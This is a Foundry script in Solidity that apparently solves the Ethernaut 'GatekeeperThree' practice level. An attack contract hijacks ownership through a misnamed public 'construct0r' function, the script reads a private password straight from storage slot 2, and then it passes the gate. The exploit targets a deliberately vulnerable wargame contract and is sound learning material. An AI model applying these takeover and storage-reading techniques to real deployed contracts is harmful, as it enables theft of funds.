// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Script.sol";
import "../src/GatekeeperThree.sol";

contract Attack{
    GatekeeperThree public g3Contract;

    constructor(address payable g3) {
        g3Contract = GatekeeperThree(g3);
    }

    function pwn() public returns(bool ans){
        ans = g3Contract.enter();
    }

    function callConstruct0r() public {
      g3Contract.construct0r();
    }

    function getBalance() public returns(uint){
        return address(g3Contract).balance;
    }
}

contract GatekeeperThreeScript is Script {
    GatekeeperThree public g3contract;
    function setUp() public {
      g3contract = GatekeeperThree(payable(vm.envAddress("GATEKEEPERTHREE_CONTRACT")));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack(payable(g3contract));
        attack.callConstruct0r();
        assert(g3contract.owner() == address(attack));
        (bool success,) = payable(g3contract).call{value: 0.002 ether}("");
        require(success, "failed");
        require(attack.getBalance() > 0.002 ether, "balance is 0");
        g3contract.createTrick();
        bytes32 pass1 = vm.load(address(g3contract.trick()), bytes32(uint256(2)));
        g3contract.getAllowance(uint(pass1));
        require(g3contract.allow_enterance() == true, "allowance not set");
        bool result = attack.pwn();
        assert(g3contract.entrant() == address(0xe9A9dde47F4ACae71fE040e6E5B16467E1C4F423));//address(vm.envAddress("GATEKEEPERTHREE_CONTRACT")));
        vm.stopBroadcast();
    }
}